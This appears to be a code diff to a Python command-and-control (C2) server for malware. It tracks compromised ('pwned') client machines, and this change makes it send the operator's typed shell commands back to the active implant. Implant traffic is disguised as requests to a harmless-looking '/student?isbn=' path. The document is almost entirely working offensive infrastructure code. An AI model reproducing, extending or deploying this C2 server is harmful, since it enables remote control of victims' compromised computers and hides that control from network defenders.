@@ -1,14 +1,23 @@
 #!/bin/python3
-
 """
 C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from enum import Enum
+
+class HTTPStatusCode(Enum):
+    OK = 200
+    CREATED = 201
+    NO_CONTENT = 204
+    BAD_REQUEST = 400
+    UNAUTHORIZED = 401
+    FORBIDDEN = 403
+    NOT_FOUND = 404
+    INTERNAL_SERVER_ERROR = 500
 
 PORT = 8900
 # Leave blank to bind to all int otherwise specify c2 server IP address
 BIND_ADDR = ""
-
 CMD_REQUEST = "/student?isbn="
 
 class C2Handler(BaseHTTPRequestHandler):
@@ -26,8 +35,7 @@ class C2Handler(BaseHTTPRequestHandler):
             
             # client not into our pwned_dict yet
             if client not in pwned_dict.values():
-                self.send_response(200)
-                self.end_headers()
+                self.http_response(HTTPStatusCode.OK.value)
 
                 pwned_id += 1
                 pwned_dict[pwned_id] = client
@@ -39,18 +47,18 @@ class C2Handler(BaseHTTPRequestHandler):
             # interactive session with client
             elif client == pwned_dict[active_session]:
                 cmd = input(f"{client_account}@{client_hostname}: ")
-                self.send_response(200)
-                self.end_headers()
-
-                print(cmd)
+                self.http_response(HTTPStatusCode.OK.value)
+                # passing back command to client; must be utf-8 encode
+                self.wfile.write(cmd.encode())
 
             # if client is in pwned_dict but is not our active session
             else:
                 # first send back 404 to the client
-                self.send_response(404)
-                self.end_headers()
+                self.http_response(HTTPStatusCode.NOT_FOUND.value)
                 
-
+    def http_response(self, code: int):
+        self.send_response(code)
+        self.end_headers()
 
     
     def log_request(self, code = "-", size = "-"):
@@ -72,5 +80,3 @@ server.serve_forever()
 #     server_address = ('', 8900)
 #     httpd = server_class(server_address, handler_class)
 #     httpd.serve_forever()
-
-
